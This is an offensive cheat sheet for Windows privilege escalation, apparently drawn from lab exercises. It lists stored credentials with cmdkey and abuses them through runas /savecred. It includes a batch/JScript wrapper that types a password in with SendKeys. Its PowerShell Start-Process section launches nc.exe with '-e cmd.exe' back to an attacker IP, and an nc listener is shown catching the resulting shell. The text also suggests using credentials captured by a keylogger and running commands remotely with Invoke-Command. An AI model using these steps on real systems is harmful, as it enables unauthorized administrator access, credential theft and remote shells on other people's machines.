# Manual

## 01 - Command Prompt

- This privilege escalation techniques is really easy to escalate to get the administrators group level. As the command follows:

```
C:\> cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic 
    User: 02nfpgrklkitqatu
    Local machine persistence

    Target: Domain:interactive=WIN-QBA94KB3IOF\admin
    Type: Domain Password
    User: WIN-QBA94KB3IOF\admin

C:\> dir C:\Users\<username>\AppData\Local\Microsoft\Credentials\

C:\> dir C:\Users\<username>\AppData\Roaming\Microsoft\Credentials\
```

We know the user is `admin` and the type of password is **Domain Password**. We will use the `runas` windows command to execute with admin privileges. And the flag `/savecred` will store the credentials in the **Windows Credentials** management and can be elevated without needing to re-enter the password after passing the particular username account once.

`C:\> runas /savecred /user:admin shell.exe`

- The full path of the runas.exe Windows builtin tool

`C:\Windows\system32\runas.exe /user:<DOMAIN_NAME>\<username> "C:\Windows\system32\cmd.exe /c whoami"`

We can also leverage this to make it persistent with the credentials we've obtained from the target with this script:

`$ cat savecred.bat`

---

```
@if (@CodeSection == @Batch) @then
@echo off
start "" runas /savecred /user:%1 %2
CScript //nologo //E:JScript "%~F0"
goto :EOF
@end
WScript.CreateObject("WScript.Shell").SendKeys("<password>{ENTER}");
```

The syntax is for the batch script:

`C:\> savecred.bat <path_to_shell>`

- **Start a shell handler to listen for incoming connection.**

```
$ sudo nc -lnvp 53
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.10.174.46.
Ncat: Connection from 10.10.174.46:49801.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.
```

- **And you have successfully escalated to administrator user account.**

```
C:\Windows\system32> whoami
win-qba94kb3iof\admin
C:\Windows\system32> net user %username%
net user %username%
User name                    admin
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/19/2020 10:05:42 AM
Password expires             Never
Password changeable          8/19/2020 10:05:42 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/25/2022 6:30:17 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
The command completed successfully.
```

Now let's say you have activated a keylogger to monitor the user's keyboard activities and you have got the credentials. Now you want to use credentials as an Administrator or a different user account and it might ask you a password prompt to do so since it was configured without the autologin that was modified in the registry editor.

`C:\> cmd /c <password> | runas /profile /user:<DOMAIN_NAME>\<username> cmd.exe`

## 02 - Powershell

```
PS C:\> cmdkey /list

PS C:\> Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\

PS C:\> Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

- Another method is using powershell to supply with the defined variables and execute with a powershell cmdlet `Start-Process`.

```powershell
PS C:\> $username = '<username>'
$password = '<password>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process -FilePath <path_to_shell> -NoNewWindow -Credential $credential -WorkingDirectory C:\Users\Public
```

- If you have `netcat` that you want to execute that might contain arguments.

```powershell
PS C:\> Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("<attacker_IP>","<attacker_PORT>","-e","cmd.exe") -WorkingDirectory C:\Users\Public
```

- You can also execute it remotely.

```powershell
PS C:\> $password = ConvertTo-SecureString "<password>" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential("<username>", $password)
$computer = "<IP>"
[System.Diagnostics.Process]::Start("<Commands>", $credential.Username, $credential.Password, $computer)
```

- Syntax using the `Start-Process`:

```
PS C:\> Start-Process <commands> -ArgumentList (<arg_1>,<arg_2>, <arg_n>) -verb RunAs

PS C:\> start-process cmd.exe -argumentlist ("/c", "echo", "yes") -verb runas
```

- Using the `-NoNewWindow` flag that some programs may open it with a window pop up.

`PS C:\> start-process cmd -NoNewWindow -argumentlist ("/c", "echo", "yes") -verb runas`

- Or you can remotely authenticate a network shared workstation to interact even further when you need to

```
PS C:\> invoke-command -computer <IP> -credential $credential -scriptblock { <commands> }

PS C:\> Enter-PSSession -ComputerName <IP>
```

---
## References

- [SS64 RunAs](https://ss64.com/nt/runas.html)

- [Windows Server 2012 R2](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11))

- [Windows RunAs Command Prompt](https://www.windows-commandline.com/windows-runas-command-prompt/)

- [RunAs Reverse Shell](https://gist.github.com/int0x33/eb358632a13bcd1e017a14c0fb00a52b)

- [Windows RunAs Reverse Shell](https://labs.p64cyber.com/windows-run-as-reverse-shell/)